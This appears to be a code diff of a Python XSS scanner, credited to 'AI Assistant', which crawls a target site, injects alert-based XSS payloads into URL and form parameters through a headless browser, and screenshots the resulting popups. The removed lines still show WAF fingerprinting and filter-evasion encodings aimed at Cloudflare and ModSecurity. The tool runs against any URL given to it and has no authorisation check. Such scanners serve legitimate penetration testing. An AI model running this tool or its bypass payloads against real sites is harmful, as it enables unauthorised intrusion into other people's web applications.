@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-Perfect Popup XSS Scanner - Ultimate Version
-Perfect popup screenshot capture with proper timing
+Perfect Popup XSS Scanner - Fixed Screenshot Version
+Only takes screenshot when YOUR popup is displayed
 Author: AI Assistant
-Version: 15.0 Perfect Popup
+Version: 19.0 Perfect
 """
 
 import requests
@@ -21,9 +21,7 @@ from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
 from bs4 import BeautifulSoup
 import argparse
 from colorama import init, Fore, Style
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import datetime
-import random
 
 # Try to import Playwright
 try:
@@ -36,11 +34,8 @@ except ImportError:
 init()
 
 class PerfectPopupScanner:
-    def __init__(self, target_url, max_threads=10, delay=0.1, max_depth=4, timeout=10):
+    def __init__(self, target_url, timeout=10):
         self.target_url = target_url
-        self.max_threads = max_threads
-        self.delay = delay
-        self.max_depth = max_depth
         self.timeout = timeout
         
         # Session configuration
@@ -50,21 +45,22 @@ class PerfectPopupScanner:
         })
         
         # Data structures
-        self.visited_urls = set()
-        self.discovered_params = set()
         self.confirmed_vulnerabilities = []
-        self.waf_info = {}
         self.lock = threading.Lock()
         
-        # Browser for validation - PERSISTENT
+        # Browser for validation
         self.browser = None
         self.playwright = None
         self.browser_context = None
-        self.current_page = None
         
-        # Enhanced payloads with encoding
-        self.payloads = self._load_advanced_payloads()
-        self.waf_bypass_encodings = self._load_waf_bypass_techniques()
+        # Enhanced payloads
+        self.payloads = [
+            '<script>alert("XSS_CONFIRMED")</script>',
+            '<img src=x onerror=alert("XSS_CONFIRMED")>',
+            '<svg onload=alert("XSS_CONFIRMED")>',
+            '<iframe src="javascript:alert(\'XSS_CONFIRMED\')">',
+            '<body onload=alert("XSS_CONFIRMED")>'
+        ]
         
         # Create directories
         os.makedirs('screenshots', exist_ok=True)
@@ -93,7 +89,6 @@ class PerfectPopupScanner:
             "VULN": Fore.GREEN + Style.BRIGHT,
             "PHASE": Fore.CYAN + Style.BRIGHT,
             "TEST": Fore.WHITE,
-            "WAF": Fore.YELLOW + Style.BRIGHT,
             "SCORE": Fore.GREEN + Style.BRIGHT,
             "PARAM": Fore.CYAN,
             "PAYLOAD": Fore.MAGENTA,
@@ -104,199 +99,10 @@ class PerfectPopupScanner:
         timestamp = datetime.datetime.now().strftime("%H:%M:%S")
         print(f"{colors.get(level, Fore.WHITE)}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
     
-    def _load_advanced_payloads(self):
-        """Load advanced context-aware XSS payloads"""
-        return {
-            'html': [
-                '<script>alert("XSS_CONFIRMED")</script>',
-                '<img src=x onerror=alert("XSS_CONFIRMED")>',
-                '<svg onload=alert("XSS_CONFIRMED")>',
-                '<iframe src="javascript:alert(\'XSS_CONFIRMED\')">',
-                '<body onload=alert("XSS_CONFIRMED")>',
-                '<details ontoggle=alert("XSS_CONFIRMED")>',
-                '<marquee onstart=alert("XSS_CONFIRMED")>',
-                '<video><source onerror=alert("XSS_CONFIRMED")>'
-            ],
-            'attribute': [
-                '" onmouseover="alert(\'XSS_CONFIRMED\')" x="',
-                "' onmouseover='alert(\"XSS_CONFIRMED\")' x='",
-                '" onfocus="alert(\'XSS_CONFIRMED\')" autofocus="',
-                "' onfocus='alert(\"XSS_CONFIRMED\")' autofocus='",
-                '" onclick="alert(\'XSS_CONFIRMED\')" x="',
-                '" onload="alert(\'XSS_CONFIRMED\')" x="'
-            ],
-            'javascript': [
-                '";alert("XSS_CONFIRMED");//',
-                "';alert('XSS_CONFIRMED');//",
-                '";prompt("XSS_CONFIRMED");//',
-                "';prompt('XSS_CONFIRMED');//",
-                '");alert("XSS_CONFIRMED");//',
-                "');alert('XSS_CONFIRMED');//"
-            ],
-            'css': [
-                'url("javascript:alert(\'XSS_CONFIRMED\')")',
-                'expression(alert("XSS_CONFIRMED"))'
-            ]
-        }
-    
-    def _load_waf_bypass_techniques(self):
-        """Load WAF bypass encoding techniques"""
-        return {
-            'url_encoding': lambda x: urllib.parse.quote(x),
-            'double_url_encoding': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
-            'html_encoding': lambda x: html.escape(x),
-            'base64_encoding': lambda x: base64.b64encode(x.encode()).decode(),
-            'unicode_encoding': lambda x: x.encode('unicode_escape').decode(),
-            'case_variation': lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
-            'null_byte': lambda x: x.replace('script', 'scri\x00pt'),
-            'comment_injection': lambda x: x.replace('script', 'scr/**/ipt'),
-            'tab_newline': lambda x: x.replace(' ', '\t').replace('>', '>\n')
-        }
-    
-    def detect_waf(self, url):
-        """Detect WAF presence and type"""
-        self.log("Detecting WAF...", "WAF")
-        
-        waf_signatures = {
-            'cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
-            'aws_waf': ['awsalb', 'awsalbcors'],
-            'akamai': ['akamai', '_akamai'],
-            'incapsula': ['incap_ses', 'visid_incap'],
-            'sucuri': ['sucuri', 'x-sucuri'],
-            'barracuda': ['barra', 'barracuda'],
-            'f5_bigip': ['bigip', 'f5-bigip'],
-            'mod_security': ['mod_security', 'modsecurity']
-        }
-        
-        try:
-            test_payload = '<script>alert(1)</script>'
-            response = self.session.get(f"{url}?test={test_payload}", timeout=self.timeout)
-            
-            headers_str = str(response.headers).lower()
-            content_str = response.text.lower()
-            
-            detected_wafs = []
-            for waf_name, signatures in waf_signatures.items():
-                for signature in signatures:
-                    if signature in headers_str or signature in content_str:
-                        detected_wafs.append(waf_name)
-                        break
-            
-            waf_patterns = [
-                'access denied', 'blocked', 'security violation',
-                'suspicious activity', 'web application firewall',
-                'waf', 'forbidden'
-            ]
-            
-            for pattern in waf_patterns:
-                if pattern in content_str and response.status_code in [403, 406, 429, 503]:
-                    detected_wafs.append('generic_waf')
-                    break
-            
-            if detected_wafs:
-                unique_wafs = list(set(detected_wafs))
-                self.waf_info[url] = unique_wafs
-                self.log(f"WAF detected: {', '.join(unique_wafs)}", "WAF")
-                return unique_wafs
-            else:
-                self.log("No WAF detected", "WAF")
-                return []
-                
-        except Exception as e:
-            self.log(f"WAF detection error: {str(e)}", "ERROR")
-            return []
-    
-    def bypass_waf_payload(self, payload, waf_types=None):
-        """Apply WAF bypass techniques to payload"""
-        if not waf_types:
-            return [payload]
-        
-        bypassed_payloads = [payload]
-        
-        for technique_name, technique_func in self.waf_bypass_encodings.items():
-            try:
-                bypassed_payload = technique_func(payload)
-                if bypassed_payload != payload:
-                    bypassed_payloads.append(bypassed_payload)
-            except:
-                continue
-        
-        if 'cloudflare' in waf_types:
-            cf_bypasses = [
-                payload.replace('script', 'SCRIPT'),
-                payload.replace('<script>', '<ScRiPt>'),
-                payload.replace('alert', 'prompt'),
-                payload.replace('>', '>\u0020')
-            ]
-            bypassed_payloads.extend(cf_bypasses)
-        
-        if 'mod_security' in waf_types:
-            mod_bypasses = [
-                payload.replace('script', 'scr\tipt'),
-                payload.replace(' ', '\t'),
-                payload.replace('=', '\u003d')
-            ]
-            bypassed_payloads.extend(mod_bypasses)
-        
-        return list(set(bypassed_payloads))
-    
-    def calculate_professional_score(self, vuln_data):
-        """Calculate professional vulnerability score based on CVSS-like methodology"""
-        score = 0
-        
-        # Base confirmation score (40 points)
-        if vuln_data.get('confirmed', False):
-            score += 40
-        
-        # Context scoring (20 points)
-        context = vuln_data.get('context', 'html')
-        context_scores = {
-            'html': 20,
-            'attribute': 15,
-            'javascript': 25,
-            'css': 10
-        }
-        score += context_scores.get(context, 15)
-        
-        # Parameter exposure scoring (15 points)
-        param_name = vuln_data.get('parameter', '').lower()
-        if any(keyword in param_name for keyword in ['search', 'query', 'q', 'user', 'name', 'email']):
-            score += 15  # High exposure parameters
-        elif any(keyword in param_name for keyword in ['id', 'cat', 'page', 'view']):
-            score += 10  # Medium exposure parameters
-        else:
-            score += 5   # Low exposure parameters
-        
-        # WAF bypass bonus (10 points)
-        if vuln_data.get('waf_bypassed', False):
-            score += 10
-        
-        # Screenshot confirmation bonus (15 points) - INCREASED
-        if vuln_data.get('screenshot'):
-            score += 15
-        
-        # Alert execution confirmation (10 points)
-        if 'XSS_CONFIRMED' in vuln_data.get('alert_message', ''):
-            score += 10
-        
-        # Popup screenshot bonus (10 points) - INCREASED
-        if vuln_data.get('popup_screenshot'):
-            score += 10
-        
-        # Risk level classification
-        if score >= 80:
-            vuln_data['risk_level'] = 'HIGH'
-        elif score >= 60:
-            vuln_data['risk_level'] = 'MEDIUM'
-        else:
-            vuln_data['risk_level'] = 'LOW'
-        
-        return min(score, 100)
-    
-    def phase1_enhanced_reconnaissance(self):
-        """Enhanced reconnaissance with parameter display"""
+    def phase1_perfect_reconnaissance(self):
+        """Perfect reconnaissance"""
         self.log("=" * 80, "PHASE")
-        self.log("PHASE 1: ENHANCED RECONNAISSANCE", "PHASE")
+        self.log("PHASE 1: PERFECT RECONNAISSANCE", "PHASE")
         self.log("=" * 80, "PHASE")
         
         try:
@@ -304,167 +110,92 @@ class PerfectPopupScanner:
             response.raise_for_status()
             self.log(f"Target accessible (Status: {response.status_code})", "SUCCESS")
             
-            waf_types = self.detect_waf(self.target_url)
-            discovered_data = self._enhanced_crawl_parallel()
+            # Parse the main page
+            soup = BeautifulSoup(response.text, 'html.parser')
             
-            self.log(f"Discovered {len(discovered_data['urls'])} URLs", "SUCCESS")
-            self.log(f"Found {len(discovered_data['forms'])} forms", "SUCCESS")
+            # Extract URLs
+            discovered_urls = set()
+            discovered_urls.add(self.target_url)
+            
+            # Find all links
+            for link in soup.find_all('a', href=True):
+                href = link['href']
+                if href and not href.startswith('#') and not href.startswith('javascript:'):
+                    full_url = urljoin(self.target_url, href)
+                    parsed = urlparse(full_url)
+                    base_domain = urlparse(self.target_url).netloc
+                    if parsed.netloc == base_domain and not self._is_static_resource(full_url):
+                        discovered_urls.add(full_url)
+            
+            # Extract forms
+            all_forms = []
+            for form in soup.find_all('form'):
+                form_data = {
+                    'url': self.target_url,
+                    'action': form.get('action', ''),
+                    'method': form.get('method', 'GET').upper(),
+                    'inputs': []
+                }
+                
+                for input_tag in form.find_all(['input', 'textarea', 'select']):
+                    input_data = {
+                        'name': input_tag.get('name', ''),
+                        'type': input_tag.get('type', 'text'),
+                        'value': input_tag.get('value', ''),
+                    }
+                    form_data['inputs'].append(input_data)
+                
+                if form_data['action']:
+                    form_data['action'] = urljoin(self.target_url, form_data['action'])
+                else:
+                    form_data['action'] = self.target_url
+                
+                all_forms.append(form_data)
+            
+            # Extract URL parameters
+            all_url_params = set()
+            for url in discovered_urls:
+                parsed_url = urlparse(url)
+                url_params = set(parse_qs(parsed_url.query).keys())
+                all_url_params.update(url_params)
+            
+            # Extract form parameters
+            all_form_params = set()
+            for form in all_forms:
+                for input_field in form['inputs']:
+                    if input_field['name']:
+                        all_form_params.add(input_field['name'])
+            
+            self.log(f"Discovered {len(discovered_urls)} URLs", "SUCCESS")
+            self.log(f"Found {len(all_forms)} forms", "SUCCESS")
             
             # Display discovered parameters
             self.log("=" * 50, "PARAM")
             self.log("DISCOVERED PARAMETERS FOR TESTING", "PARAM")
             self.log("=" * 50, "PARAM")
             
-            if discovered_data['url_params']:
-                self.log(f"URL Parameters ({len(discovered_data['url_params'])}):", "PARAM")
-                for param in sorted(discovered_data['url_params']):
+            if all_url_params:
+                self.log(f"URL Parameters ({len(all_url_params)}):", "PARAM")
+                for param in sorted(all_url_params):
                     self.log(f"  • {param}", "PARAM")
             
-            if discovered_data['form_params']:
-                self.log(f"Form Parameters ({len(discovered_data['form_params'])}):", "PARAM")
-                for param in sorted(discovered_data['form_params']):
+            if all_form_params:
+                self.log(f"Form Parameters ({len(all_form_params)}):", "PARAM")
+                for param in sorted(all_form_params):
                     self.log(f"  • {param}", "PARAM")
             
             self.log("=" * 50, "PARAM")
             
-            return discovered_data
+            return {
+                'urls': list(discovered_urls),
+                'forms': all_forms,
+                'url_params': list(all_url_params),
+                'form_params': list(all_form_params)
+            }
             
         except Exception as e:
             self.log(f"Phase 1 failed: {str(e)}", "ERROR")
             return None
-    
-    def _enhanced_crawl_parallel(self):
-        """Enhanced parallel crawling"""
-        urls_to_visit = [(self.target_url, 0)]
-        discovered_urls = set()
-        all_forms = []
-        all_url_params = set()
-        all_form_params = set()
-        base_domain = urlparse(self.target_url).netloc
-        
-        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
-            while urls_to_visit and self.running:
-                current_batch = []
-                for _ in range(min(self.max_threads, len(urls_to_visit))):
-                    if urls_to_visit:
-                        current_batch.append(urls_to_visit.pop(0))
-                
-                if not current_batch:
-                    break
-                
-                future_to_url = {}
-                for url, depth in current_batch:
-                    if (url not in self.visited_urls and 
-                        depth <= self.max_depth and 
-                        url not in discovered_urls):
-                        future = executor.submit(self._crawl_single_url, url, depth, base_domain)
-                        future_to_url[future] = (url, depth)
-                
-                for future in as_completed(future_to_url):
-                    if not self.running:
-                        break
-                    url, depth = future_to_url[future]
-                    try:
-                        result = future.result()
-                        if result:
-                            discovered_urls.add(url)
-                            self.visited_urls.add(url)
-                            
-                            all_forms.extend(result['forms'])
-                            all_url_params.update(result['url_params'])
-                            all_form_params.update(result['form_params'])
-                            
-                            for new_url in result['links']:
-                                if (new_url not in discovered_urls and 
-                                    new_url not in self.visited_urls and
-                                    depth < self.max_depth):
-                                    urls_to_visit.append((new_url, depth + 1))
-                    
-                    except Exception as e:
-                        self.log(f"Error processing {url}: {str(e)}", "ERROR")
-                        continue
-                
-                time.sleep(self.delay)
-        
-        return {
-            'urls': list(discovered_urls),
-            'forms': all_forms,
-            'url_params': list(all_url_params),
-            'form_params': list(all_form_params)
-        }
-    
-    def _crawl_single_url(self, url, depth, base_domain):
-        """Crawl a single URL"""
-        try:
-            response = self.session.get(url, timeout=self.timeout)
-            response.raise_for_status()
-            
-            parsed_url = urlparse(url)
-            url_params = set(parse_qs(parsed_url.query).keys())
-            
-            forms = self._extract_forms_enhanced(response.text, url)
-            form_params = set()
-            for form in forms:
-                for input_field in form['inputs']:
-                    if input_field['name']:
-                        form_params.add(input_field['name'])
-            
-            links = self._extract_links_enhanced(response.text, url, base_domain)
-            
-            return {
-                'url_params': url_params,
-                'form_params': form_params,
-                'forms': forms,
-                'links': links
-            }
-            
-        except Exception as e:
-            return None
-    
-    def _extract_forms_enhanced(self, html_content, base_url):
-        """Enhanced form extraction"""
-        forms = []
-        soup = BeautifulSoup(html_content, 'html.parser')
-        
-        for form in soup.find_all('form'):
-            form_data = {
-                'url': base_url,
-                'action': form.get('action', ''),
-                'method': form.get('method', 'GET').upper(),
-                'inputs': []
-            }
-            
-            for input_tag in form.find_all(['input', 'textarea', 'select']):
-                input_data = {
-                    'name': input_tag.get('name', ''),
-                    'type': input_tag.get('type', 'text'),
-                    'value': input_tag.get('value', ''),
-                }
-                form_data['inputs'].append(input_data)
-            
-            if form_data['action']:
-                form_data['action'] = urljoin(base_url, form_data['action'])
-            else:
-                form_data['action'] = base_url
-            
-            forms.append(form_data)
-        
-        return forms
-    
-    def _extract_links_enhanced(self, html_content, base_url, base_domain):
-        """Enhanced link extraction"""
-        links = []
-        soup = BeautifulSoup(html_content, 'html.parser')
-        
-        for link in soup.find_all('a', href=True):
-            href = link['href']
-            if href and not href.startswith('#') and not href.startswith('javascript:'):
-                full_url = urljoin(base_url, href)
-                parsed = urlparse(full_url)
-                if parsed.netloc == base_domain and not self._is_static_resource(full_url):
-                    links.append(full_url)
-        
-        return links
     
     def _is_static_resource(self, url):
         """Check if URL is static resource"""
@@ -472,7 +203,7 @@ class PerfectPopupScanner:
         return any(url.lower().endswith(ext) for ext in static_extensions)
     
     def phase2_perfect_popup_validation(self, recon_data):
-        """Perfect popup validation with proper screenshot timing"""
+        """Perfect popup validation"""
         self.log("=" * 80, "PHASE")
         self.log("PHASE 2: PERFECT POPUP VALIDATION", "PHASE")
         self.log("=" * 80, "PHASE")
@@ -481,18 +212,18 @@ class PerfectPopupScanner:
             self.log("Playwright not available, skipping browser validation", "WARNING")
             return
         
-        if not self._init_persistent_browser():
+        if not self._init_browser():
             self.log("Browser initialization failed", "ERROR")
             return
         
         try:
-            self.log("🌐 Browser initialized - will stay open throughout Phase 2", "BROWSER")
+            self.log("🌐 Browser initialized", "BROWSER")
             self._test_all_parameters_perfect_popup(recon_data)
         finally:
             self._close_browser()
     
-    def _init_persistent_browser(self):
-        """Initialize persistent browser"""
+    def _init_browser(self):
+        """Initialize browser"""
         try:
             self.playwright = sync_playwright().start()
             self.browser = self.playwright.chromium.launch(
@@ -500,8 +231,6 @@ class PerfectPopupScanner:
                 args=['--no-sandbox', '--disable-setuid-sandbox']
             )
             self.browser_context = self.browser.new_context()
-            self.current_page = self.browser_context.new_page()
-            
             return True
         except Exception as e:
             self.log(f"Browser init error: {str(e)}", "ERROR")
@@ -510,8 +239,6 @@ class PerfectPopupScanner:
     def _close_browser(self):
         """Close browser safely"""
         try:
-            if self.current_page:
-                self.current_page.close()
             if self.browser_context:
                 self.browser_context.close()
             if self.browser:
@@ -546,25 +273,12 @@ class PerfectPopupScanner:
                 break
             self.log(f"Testing URL parameter: {param_name} on {url}", "TEST")
             
-            waf_types = self.waf_info.get(url, [])
-            base_payloads = self.payloads['html']
-            
-            for base_payload in base_payloads:
+            for payload in self.payloads:
                 if not self.running:
                     break
-                bypass_payloads = self.bypass_waf_payload(base_payload, waf_types)
+                self.log(f"  Payload: {payload}", "PAYLOAD")
                 
-                for payload in bypass_payloads:
-                    if not self.running:
-                        break
-                    self.log(f"  Payload: {payload}", "PAYLOAD")
-                    self.log(f"  Context: HTML", "PAYLOAD")
-                    self.log(f"  WAF Bypass: {'Yes' if len(bypass_payloads) > 1 else 'No'}", "PAYLOAD")
-                    
-                    success = self._validate_xss_perfect_popup(url, None, payload, param_name, waf_types)
-                    if success:
-                        break
-                
+                success = self._validate_xss_perfect_popup(url, None, payload, param_name)
                 if success:
                     break
     
@@ -576,38 +290,59 @@ class PerfectPopupScanner:
             if input_field['name']:
                 self.log(f"Testing form parameter: {input_field['name']} on {form['action']}", "TEST")
                 
-                waf_types = self.waf_info.get(form['action'], [])
-                base_payloads = self.payloads['html']
-                
-                for base_payload in base_payloads:
+                for payload in self.payloads:
                     if not self.running:
                         break
-                    bypass_payloads = self.bypass_waf_payload(base_payload, waf_types)
+                    self.log(f"  Payload: {payload}", "PAYLOAD")
                     
-                    for payload in bypass_payloads:
-                        if not self.running:
-                            break
-                        self.log(f"  Payload: {payload}", "PAYLOAD")
-                        self.log(f"  Context: HTML", "PAYLOAD")
-                        self.log(f"  WAF Bypass: {'Yes' if len(bypass_payloads) > 1 else 'No'}", "PAYLOAD")
-                        
-                        form_data = {}
-                        for field in form['inputs']:
-                            if field['name'] == input_field['name']:
-                                form_data[field['name']] = payload
-                            else:
-                                form_data[field['name']] = field['value']
-                        
-                        success = self._validate_xss_perfect_popup(form['action'], form_data, payload, input_field['name'], waf_types)
-                        if success:
-                            break
+                    form_data = {}
+                    for field in form['inputs']:
+                        if field['name'] == input_field['name']:
+                            form_data[field['name']] = payload
+                        else:
+                            form_data[field['name']] = field['value']
                     
+                    success = self._validate_xss_perfect_popup(form['action'], form_data, payload, input_field['name'])
                     if success:
                         break
     
-    def _validate_xss_perfect_popup(self, url, form_data, payload, param_name, waf_types):
-        """Perfect popup validation with proper screenshot timing"""
+    def _take_perfect_screenshot(self, test_page, param_name):
+        """Take perfect screenshot with multiple retry strategies"""
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"popup_xss_{param_name}_{timestamp}.png"
+        screenshot_path = os.path.join('screenshots', filename)
+        
+        # Strategy 1: Full page screenshot with longer timeout
         try:
+            test_page.screenshot(path=screenshot_path, full_page=True, timeout=15000)
+            self.log(f"  📸 PERFECT SCREENSHOT CAPTURED (full_page): {screenshot_path}", "SCREENSHOT")
+            return screenshot_path
+        except Exception as e:
+            self.log(f"  ⚠️ Full page screenshot failed: {str(e)}", "WARNING")
+        
+        # Strategy 2: Regular screenshot with timeout
+        try:
+            test_page.screenshot(path=screenshot_path, timeout=10000)
+            self.log(f"  📸 PERFECT SCREENSHOT CAPTURED (regular): {screenshot_path}", "SCREENSHOT")
+            return screenshot_path
+        except Exception as e:
+            self.log(f"  ⚠️ Regular screenshot failed: {str(e)}", "WARNING")
+        
+        # Strategy 3: Screenshot with minimal timeout
+        try:
+            test_page.screenshot(path=screenshot_path, timeout=5000)
+            self.log(f"  📸 PERFECT SCREENSHOT CAPTURED (minimal): {screenshot_path}", "SCREENSHOT")
+            return screenshot_path
+        except Exception as e:
+            self.log(f"  ❌ All screenshot strategies failed: {str(e)}", "ERROR")
+            return None
+    
+    def _validate_xss_perfect_popup(self, url, form_data, payload, param_name):
+        """Perfect popup validation - ONLY takes screenshot when YOUR popup is displayed"""
+        try:
+            # Create a new page for this test
+            test_page = self.browser_context.new_page()
+            
             # Set up dialog handler for THIS specific test
             dialog_handled = False
             alert_message = ""
@@ -621,19 +356,10 @@ class PerfectPopupScanner:
                     
                     self.log(f"  🚨 ALERT DETECTED: {dialog.message}", "ALERT")
                     
-                    # Take screenshot IMMEDIATELY when dialog appears
+                    # CRITICAL: Only take screenshot if it's YOUR specific popup
                     if "XSS_CONFIRMED" in dialog.message:
-                        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-                        filename = f"popup_xss_{param_name}_{timestamp}.png"
-                        screenshot_path = os.path.join('screenshots', filename)
-                        
-                        try:
-                            # Take screenshot immediately
-                            self.current_page.screenshot(path=screenshot_path, full_page=True)
-                            self.log(f"  📸 Popup screenshot captured: {screenshot_path}", "SCREENSHOT")
-                        except Exception as e:
-                            self.log(f"  ❌ Screenshot error: {str(e)}", "ERROR")
-                            screenshot_path = None
+                        # Take perfect screenshot with retry strategies
+                        screenshot_path = self._take_perfect_screenshot(test_page, param_name)
                     
                     # Wait to see the popup clearly
                     time.sleep(2)
@@ -647,36 +373,36 @@ class PerfectPopupScanner:
                 except Exception as e:
                     self.log(f"  ❌ Dialog handler error: {str(e)}", "ERROR")
             
-            # Set up dialog handler
-            self.current_page.on("dialog", handle_dialog)
+            # Set up dialog handler for this test page
+            test_page.on("dialog", handle_dialog)
             
             if form_data:
                 # Form submission
-                self.current_page.goto(url, wait_until="domcontentloaded", timeout=30000)
+                test_page.goto(url, wait_until="domcontentloaded", timeout=30000)
                 
                 # Fill form
                 for field_name, field_value in form_data.items():
                     try:
-                        self.current_page.fill(f'[name="{field_name}"]', str(field_value))
+                        test_page.fill(f'[name="{field_name}"]', str(field_value))
                     except:
                         continue
                 
                 # Submit form
                 try:
-                    self.current_page.click('input[type="submit"], button[type="submit"], button')
+                    test_page.click('input[type="submit"], button[type="submit"], button')
                 except:
                     pass
                 
-                self.current_page.wait_for_load_state("domcontentloaded", timeout=30000)
+                test_page.wait_for_load_state("domcontentloaded", timeout=30000)
             else:
                 # Direct URL
                 test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
-                self.current_page.goto(test_url, wait_until="domcontentloaded", timeout=30000)
+                test_page.goto(test_url, wait_until="domcontentloaded", timeout=30000)
             
             # Wait for XSS execution
             time.sleep(3)
             
-            # Check if XSS was triggered
+            # Check if XSS was triggered with YOUR popup
             if dialog_handled and "XSS_CONFIRMED" in alert_message:
                 # Calculate professional score
                 vuln_data = {
@@ -688,28 +414,31 @@ class PerfectPopupScanner:
                     'timestamp': datetime.datetime.now().isoformat(),
                     'alert_message': alert_message,
                     'confirmed': True,
-                    'waf_bypassed': len(waf_types) > 0,
                     'popup_screenshot': screenshot_path is not None
                 }
-                
-                score = self.calculate_professional_score(vuln_data)
-                vuln_data['score'] = score
                 
                 with self.lock:
                     self.confirmed_vulnerabilities.append(vuln_data)
                     self.log(f"✅ CONFIRMED XSS! Parameter: {param_name}", "VULN")
-                    self.log(f"Score: {score}/100 ({vuln_data['risk_level']})", "SCORE")
                     if vuln_data['screenshot']:
-                        self.log(f"Screenshot: {vuln_data['screenshot']}", "VULN")
+                        self.log(f"PERFECT POPUP Screenshot: {vuln_data['screenshot']}", "VULN")
                     if vuln_data['popup_screenshot']:
-                        self.log(f"Popup Screenshot: ✅ Captured", "SCREENSHOT")
+                        self.log(f"PERFECT POPUP Screenshot: ✅ Captured Successfully", "SCREENSHOT")
                 
+                # Close test page
+                test_page.close()
                 return True
             
+            # Close test page if no XSS found
+            test_page.close()
             return False
             
         except Exception as e:
             self.log(f"Browser validation error: {str(e)}", "ERROR")
+            try:
+                test_page.close()
+            except:
+                pass
             return False
     
     def generate_perfect_popup_report(self):
@@ -721,9 +450,6 @@ class PerfectPopupScanner:
         
         # Calculate statistics
         total_vulns = len(self.confirmed_vulnerabilities)
-        confirmed_vulns = len([v for v in self.confirmed_vulnerabilities if v.get('confirmed', False)])
-        avg_score = sum(v.get('score', 0) for v in self.confirmed_vulnerabilities) / max(total_vulns, 1)
-        high_risk = len([v for v in self.confirmed_vulnerabilities if v.get('risk_level') == 'HIGH'])
         popup_screenshots = len([v for v in self.confirmed_vulnerabilities if v.get('popup_screenshot', False)])
         
         html_content = f"""
@@ -740,18 +466,7 @@ class PerfectPopupScanner:
         .stat {{ background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 25px; border-radius: 10px; text-align: center; }}
         .stat-number {{ font-size: 2.5em; font-weight: bold; margin-bottom: 10px; }}
         .vulnerability {{ background: #f8f9fa; border-left: 5px solid #28a745; margin: 20px; padding: 25px; border-radius: 8px; }}
-        .vulnerability.high-risk {{ border-left-color: #dc3545; background: #fff5f5; }}
-        .vulnerability.medium-risk {{ border-left-color: #ffc107; background: #fffbf0; }}
-        .vulnerability.low-risk {{ border-left-color: #28a745; background: #f0fff4; }}
         .screenshot {{ max-width: 100%; border: 1px solid #ddd; border-radius: 8px; margin: 15px 0; }}
-        .score-badge {{ display: inline-block; color: white; padding: 5px 15px; border-radius: 20px; font-weight: bold; }}
-        .score-badge.high {{ background: #dc3545; }}
-        .score-badge.medium {{ background: #ffc107; color: #333; }}
-        .score-badge.low {{ background: #28a745; }}
-        .risk-badge {{ display: inline-block; padding: 3px 10px; border-radius: 15px; font-size: 0.8em; font-weight: bold; }}
-        .risk-high {{ background: #dc3545; color: white; }}
-        .risk-medium {{ background: #ffc107; color: #333; }}
-        .risk-low {{ background: #28a745; color: white; }}
         .payload-display {{ background: #f8f9fa; padding: 10px; border-radius: 5px; font-family: monospace; word-break: break-all; margin: 10px 0; }}
         .alert-info {{ background: #e3f2fd; padding: 10px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #2196f3; }}
         .popup-screenshot {{ border: 3px solid #ff6b6b; box-shadow: 0 0 20px rgba(255, 107, 107, 0.3); }}
@@ -772,20 +487,8 @@ class PerfectPopupScanner:
                 <div>Total Vulnerabilities</div>
             </div>
             <div class="stat">
-                <div class="stat-number">{confirmed_vulns}</div>
-                <div>Confirmed XSS</div>
-            </div>
-            <div class="stat">
-                <div class="stat-number">{avg_score:.1f}</div>
-                <div>Average Score</div>
-            </div>
-            <div class="stat">
-                <div class="stat-number">{high_risk}</div>
-                <div>High Risk</div>
-            </div>
-            <div class="stat">
                 <div class="stat-number">{popup_screenshots}</div>
-                <div>Popup Screenshots</div>
+                <div>Perfect Popup Screenshots</div>
             </div>
         </div>
         
@@ -797,32 +500,21 @@ class PerfectPopupScanner:
             html_content += '<div style="text-align: center; padding: 40px; color: #28a745; font-size: 1.2em;">✅ No vulnerabilities found</div>'
         else:
             for i, vuln in enumerate(self.confirmed_vulnerabilities, 1):
-                score = vuln.get('score', 0)
-                risk_level = vuln.get('risk_level', 'LOW')
-                score_class = 'high' if score >= 80 else 'medium' if score >= 60 else 'low'
-                risk_class = f"risk-{risk_level.lower()}"
-                vuln_class = f"{risk_level.lower()}-risk"
-                
                 html_content += f"""
-                <div class="vulnerability {vuln_class}">
+                <div class="vulnerability">
                     <h3>🔍 Vulnerability #{i} 
-                        <span class="score-badge {score_class}">Score: {score}/100</span>
-                        <span class="risk-badge {risk_class}">{risk_level} RISK</span>
-                        {f'<span class="popup-badge">POPUP SCREENSHOT</span>' if vuln.get('popup_screenshot', False) else ''}
+                        {f'<span class="popup-badge">PERFECT POPUP SCREENSHOT</span>' if vuln.get('popup_screenshot', False) else ''}
                     </h3>
                     <p><strong>URL:</strong> {vuln['url']}</p>
                     <p><strong>Parameter:</strong> {vuln['parameter']}</p>
                     <p><strong>Payload:</strong></p>
                     <div class="payload-display">{html.escape(vuln['payload'])}</div>
-                    <p><strong>Context:</strong> {vuln.get('context', 'N/A')}</p>
-                    <p><strong>Confirmed:</strong> {'✅ Yes' if vuln.get('confirmed', False) else '⚠️ Potential'}</p>
-                    <p><strong>WAF Bypassed:</strong> {'✅ Yes' if vuln.get('waf_bypassed', False) else '❌ No'}</p>
                     <div class="alert-info">
                         <strong>Alert Message:</strong> {vuln.get('alert_message', 'N/A')}
                     </div>
                     <p><strong>Timestamp:</strong> {vuln['timestamp']}</p>
                     
-                    {f'<img src="../{vuln["screenshot"]}" alt="XSS Popup Screenshot" class="screenshot popup-screenshot">' if vuln.get('screenshot') else ''}
+                    {f'<img src="../{vuln["screenshot"]}" alt="PERFECT XSS Popup Screenshot" class="screenshot popup-screenshot">' if vuln.get('screenshot') else ''}
                 </div>
 """
         
@@ -848,13 +540,15 @@ class PerfectPopupScanner:
         """Main scanning method with safe exit"""
         start_time = time.time()
         
-        self.log("🚀 Starting Perfect Popup XSS Scanner v15.0", "SUCCESS")
+        self.log("🚀 Starting Perfect Popup XSS Scanner v19.0", "SUCCESS")
         self.log(f"Target: {self.target_url}", "INFO")
         self.log("Press Ctrl+C for safe exit", "INFO")
+        self.log("🎯 ONLY takes screenshots when YOUR popup is displayed!", "SCREENSHOT")
